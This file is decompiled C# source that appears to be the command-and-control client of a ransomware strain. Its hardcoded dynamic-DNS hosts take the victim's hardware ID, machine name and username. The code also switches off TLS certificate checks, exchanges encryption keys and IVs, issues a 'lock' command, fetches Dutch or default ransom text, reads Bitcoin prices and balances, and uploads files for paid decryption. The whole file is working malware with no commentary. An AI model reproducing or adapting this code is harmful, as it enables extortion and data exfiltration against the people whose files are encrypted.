using System;
using System.Collections.Specialized;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Web;

internal static class Class7
{
	private static string[] string_0 = new string[2] { "http://cvredirect.no-ip.net/", "http://cvredirect.ddns.net/" };

	private static Class5 class5_0;

	private static NameValueCollection nameValueCollection_0 = new NameValueCollection();

	[CompilerGenerated]
	private static RemoteCertificateValidationCallback remoteCertificateValidationCallback_0;

	public static void smethod_0()
	{
		ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, (RemoteCertificateValidationCallback)((object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0) => true));
		smethod_11();
	}

	public static NameValueCollection smethod_1()
	{
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("hwid", Class4.smethod_0());
		nameValueCollection.Add("func", "status");
		nameValueCollection.Add("computer", Environment.MachineName);
		nameValueCollection.Add("username", Environment.UserName);
		nameValueCollection.Add("uploadid", Class6.string_1);
		int num = 0;
		string text;
		while (true)
		{
			if (num < 10)
			{
				text = smethod_14(nameValueCollection);
				if (text != "down" && text != string.Empty)
				{
					break;
				}
				Thread.Sleep(10000);
				num++;
				continue;
			}
			return new NameValueCollection();
		}
		nameValueCollection_0 = HttpUtility.ParseQueryString(text);
		if (nameValueCollection_0["key"] != null && nameValueCollection_0["key"] != string.Empty)
		{
			class5_0 = new Class5(nameValueCollection_0["key"], nameValueCollection_0["iv"]);
		}
		return nameValueCollection_0;
	}

	public static float smethod_2()
	{
		return smethod_4("costs");
	}

	public static float smethod_3()
	{
		return smethod_4("balance");
	}

	private static float smethod_4(string string_1)
	{
		float.TryParse(nameValueCollection_0[string_1], NumberStyles.AllowDecimalPoint, CultureInfo.CreateSpecificCulture("en-US"), out var result);
		return result;
	}

	public static float smethod_5()
	{
		string text = smethod_14(null, "http://api.bitcoinaverage.com/ticker/EUR");
		string value = "ask";
		int startIndex;
		if (!text.Contains(value))
		{
			value = "EUR";
			text = smethod_14(null, "https://blockchain.info/nl/ticker");
			if (!text.Contains(value))
			{
				return 0f;
			}
			startIndex = text.IndexOf(value);
			startIndex = text.IndexOf("buy", startIndex);
		}
		else
		{
			startIndex = text.IndexOf("ask");
		}
		int i;
		int result;
		for (i = startIndex; i - startIndex < 10 && !int.TryParse(text.Substring(i, 1), out result); i++)
		{
		}
		int num = text.IndexOf(",", i);
		if (num <= i)
		{
			return 0f;
		}
		string s = text.Substring(i, num - i);
		float.TryParse(s, NumberStyles.AllowDecimalPoint, CultureInfo.CreateSpecificCulture("en-US"), out var result2);
		return result2;
	}

	public static Class5 smethod_6()
	{
		if (class5_0 == null)
		{
			NameValueCollection nameValueCollection = smethod_1();
			if (nameValueCollection["key"] != null && nameValueCollection["key"] != string.Empty)
			{
				class5_0 = new Class5(nameValueCollection["key"], nameValueCollection["iv"]);
			}
		}
		return class5_0;
	}

	public static bool smethod_7(Class5 class5_1)
	{
		class5_0 = class5_1;
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("hwid", Class4.smethod_0());
		nameValueCollection.Add("func", "setkey");
		nameValueCollection.Add("key", class5_1.String_0);
		nameValueCollection.Add("iv", class5_1.String_1);
		string text = smethod_14(nameValueCollection);
		if (!(text == "OK"))
		{
			return false;
		}
		return true;
	}

	public static void smethod_8()
	{
		class5_0 = null;
	}

	public static bool smethod_9()
	{
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("hwid", Class4.smethod_0());
		nameValueCollection.Add("func", "lock");
		string text = smethod_14(nameValueCollection);
		if (!(text == "OK"))
		{
			return false;
		}
		return true;
	}

	public static string smethod_10()
	{
		if (CultureInfo.CurrentUICulture.Name.Contains("nl"))
		{
			return smethod_13("tmpNL.dat");
		}
		return smethod_13("tmp.dat");
	}

	private static void smethod_11()
	{
		for (int i = 0; i < string_0.Length; i++)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_0[i]);
				httpWebRequest.AllowAutoRedirect = false;
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				string_0[i] = httpWebResponse.Headers["Location"];
				httpWebResponse.Close();
			}
			catch (Exception)
			{
				i--;
			}
		}
	}

	public static int smethod_12(string string_1, string string_2, bool bool_0 = true)
	{
		if (File.Exists(string_2))
		{
			try
			{
				File.Delete(string_2);
			}
			catch (Exception)
			{
			}
		}
		int num = 0;
		Stream stream = null;
		Stream stream2 = null;
		WebResponse webResponse = null;
		int num2 = 0;
		while (!File.Exists(string_2) && num2 < string_0.Length)
		{
			try
			{
				WebRequest webRequest = ((!bool_0) ? WebRequest.Create(string_1) : WebRequest.Create(string_0[num2] + string_1));
				if (webRequest == null)
				{
					continue;
				}
				webResponse = webRequest.GetResponse();
				if (webResponse != null)
				{
					stream = webResponse.GetResponseStream();
					stream2 = File.Create(string_2);
					byte[] array = new byte[1024];
					int num3;
					do
					{
						num3 = stream.Read(array, 0, array.Length);
						stream2.Write(array, 0, num3);
						num += num3;
					}
					while (num3 > 0);
				}
			}
			catch (Exception)
			{
				num2++;
			}
			finally
			{
				webResponse?.Close();
				stream?.Close();
				stream2?.Close();
			}
		}
		return num;
	}

	private static string smethod_13(string string_1)
	{
		string text = string.Empty;
		int num = 0;
		while (text == string.Empty && num < string_0.Length)
		{
			try
			{
				WebRequest webRequest = WebRequest.Create(string_0[num] + string_1);
				webRequest.Method = "GET";
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				text = streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				response.Close();
			}
			catch (WebException)
			{
				text = string.Empty;
				num++;
			}
		}
		return text;
	}

	public static string smethod_14(NameValueCollection nameValueCollection_1, string string_1 = null)
	{
		string text = string.Empty;
		int num = 0;
		while (text == string.Empty && num < string_0.Length)
		{
			try
			{
				WebRequest webRequest = ((string_1 != null) ? WebRequest.Create(string_1) : WebRequest.Create(string_0[num]));
				webRequest.Method = "POST";
				StringBuilder stringBuilder = new StringBuilder();
				if (nameValueCollection_1 != null)
				{
					foreach (string key in nameValueCollection_1.Keys)
					{
						stringBuilder.AppendFormat("{0}={1}&", HttpUtility.UrlEncode(key, Encoding.Default), HttpUtility.UrlEncode(nameValueCollection_1[key], Encoding.Default));
					}
					stringBuilder.Length--;
				}
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = stringBuilder.Length;
				using (StreamWriter streamWriter = new StreamWriter(webRequest.GetRequestStream()))
				{
					streamWriter.Write(stringBuilder.ToString());
				}
				WebResponse response = webRequest.GetResponse();
				Stream responseStream = response.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				text = streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				response.Close();
			}
			catch (WebException)
			{
				text = string.Empty;
				num++;
			}
		}
		return text;
	}

	public static byte[] smethod_15(byte[] byte_0)
	{
		string s = string.Empty;
		int num = 0;
		while (num < string_0.Length)
		{
			try
			{
				string text = Path.Combine(Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location), "temp.data");
				File.WriteAllBytes(text, byte_0);
				WebClient webClient = new WebClient();
				webClient.Headers.Add("hwid", Class4.smethod_0());
				webClient.Headers.Add("Content-Type", "binary/octet-stream");
				byte[] array = webClient.UploadFile(string_0[num] + "decryptFile.php", text);
				s = Encoding.UTF8.GetString(array, 0, array.Length);
				byte[] bytes = Convert.FromBase64String(s);
				Encoding.UTF8.GetString(bytes);
				File.Delete(text);
			}
			catch (Exception)
			{
				continue;
			}
			finally
			{
				num++;
			}
			break;
		}
		return Convert.FromBase64String(s);
	}

	[CompilerGenerated]
	private static bool smethod_16(object object_0, X509Certificate x509Certificate_0, X509Chain x509Chain_0, SslPolicyErrors sslPolicyErrors_0)
	{
		return true;
	}
}
